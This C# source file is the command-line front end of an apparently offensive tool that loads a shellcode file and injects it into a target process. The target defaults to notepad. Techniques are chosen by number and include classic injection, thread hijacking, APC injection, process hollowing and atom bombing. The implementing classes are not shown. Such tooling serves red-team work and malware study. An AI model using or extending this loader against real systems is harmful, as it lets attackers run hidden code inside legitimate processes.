using System;
using System.IO;
using System.Diagnostics;

using static ShellcodeInjectionTechniques.Debugger;

namespace ShellcodeInjectionTechniques
{
    class Program
    {
        static void Main(string[] args)
        {
            // Test if input arguments were supplied.
            if (args.Length < 2)
            {
                Console.WriteLine("Please enter technique number, shellcode file and process id.");
                Console.WriteLine("Usage: Injector <technique no.> <SHELLCODE> [PID - default: notepad pid]");
                Console.WriteLine("  1. Shellcode Runner");
                Console.WriteLine("  2. Classic Injection");
                Console.WriteLine("  3. Thread Hijacking");
                Console.WriteLine("  4. Local Thread Hijacking");
                Console.WriteLine("  5. Asychronous Procedure Call Injection(APC Injection)");
                Console.WriteLine("  6. Process Hollowing");
                Console.WriteLine("  7. Inter - Process Mapped View");
                Console.WriteLine("  8. Atom Bombing");
                Console.WriteLine("  9. Process Doppelgänging(TODO)");
                return;
            }

            if (!int.TryParse(args[0], out int choice) || choice < 1 || choice > 10)
            {
                Console.WriteLine("Invalid technique choice.");
                Console.WriteLine("Available Techniques:");
                Console.WriteLine("  1. Shellcode Runner");
                Console.WriteLine("  2. Classic Injection");
                Console.WriteLine("  3. Thread Hijacking");
                Console.WriteLine("  4. Local Thread Hijacking");
                Console.WriteLine("  5. Asychronous Procedure Call Injection(APC Injection)");
                Console.WriteLine("  6. Process Hollowing");
                Console.WriteLine("  7. Inter - Process Mapped View");
                Console.WriteLine("  8. Atom Bombing");
                Console.WriteLine("  9. Process Doppelgänging(TODO)");
                return;
            }

            var filePath = args[1];

            if (!File.Exists(filePath))
            {
                Console.WriteLine($"File not found: {filePath}");
                return;
            }

            byte[] shellcode = System.IO.File.ReadAllBytes(filePath);

            Process target = null;
            Process[] processes;

            if (args.Length < 3)
            {
                // get the process to target
                processes = Process.GetProcessesByName("notepad");

                if (processes.Length == 0)
                {
                    Console.WriteLine("[!] Unable to find 'notepad.exe' PID to inject into!");
                    return;
                }

                Console.WriteLine("[+] Found 'notepad.exe' process: {0}", new string[] { processes[0].Id.ToString() });
                target = processes[0];

            } else
            {
                if (!int.TryParse(args[2], out int pid) || pid < 0)
                {
                    Console.WriteLine("Invalid process ID.");
                    return;
                }

                try
                {
                    target = Process.GetProcessById(pid);
                    Console.WriteLine($"Found process ID {pid} running.");
                }
                catch (ArgumentException)
                {
                    Console.WriteLine($"Unable to find process with ID {pid} to inject into!");
                    return;
                }
            }

            ITechnique teckers = new ShellcodeRunner();

            switch (choice)
            {
                case 1:
                    Console.WriteLine("[*] Injection Technique: 1. Shellcode Runner");
                    teckers = new ShellcodeRunner();
                    break;
                case 2:
                    Console.WriteLine("[*] Injection Technique: 2. Classic Injection");
                    teckers = new ClassicInjection();
                    break;
                case 3:
                    Console.WriteLine("[*] Injection Technique: 3. Thread Hijacking");
                    teckers = new ThreadHijack();
                    break;
                case 4:
                    Console.WriteLine("[*] Injection Technique: 4. Local Thread Hijacking");
                    teckers = new LocalThreadHijack();
                    break;
                case 5:
                    Console.WriteLine("[*] Injection Technique: 5. Asychronous Procedure Call Injection (APC Injection)");
                    teckers = new APCInjection();
                    break;
                case 6:
                    Console.WriteLine("[*] Injection Technique: 6. Process Hollowing");
                    teckers = new ProcessHollow();
                    break;
                case 7:
                    Console.WriteLine("[*] Injection Technique: 7. Inter-Process Mapped View");
                    teckers = new InterProcessMappedView();
                    break;
                case 8:
                    Console.WriteLine("[*] Injection Technique: 8. Atom Bombing");
                    teckers = new AtomBomb();
                    break;
                case 9:
                    Console.WriteLine("[*] Injection Technique: 9. Process Doppelgänging(TODO)");
                    break;
                default:
                    Console.WriteLine("Invalid technique choice.");
                    Console.WriteLine("Available Techniques:");
                    Console.WriteLine("  1. Shellcode Runner");
                    Console.WriteLine("  2. Classic Injection");
                    Console.WriteLine("  3. Thread Hijacking");
                    Console.WriteLine("  4. Local Thread Hijacking");
                    Console.WriteLine("  5. Asychronous Procedure Call Injection(APC Injection)");
                    Console.WriteLine("  6. Process Hollowing");
                    Console.WriteLine("  7. Inter - Process Mapped View");
                    Console.WriteLine("  8. Atom Bombing");
                    Console.WriteLine("  9. Process Doppelgänging(TODO)");
                    break;
            }

            // send the shellcode to the chosen technique to run
            teckers.Run(target, shellcode);


            // for debugging
#if DEBUG
            Console.ReadLine();
#endif
        }
    }
}
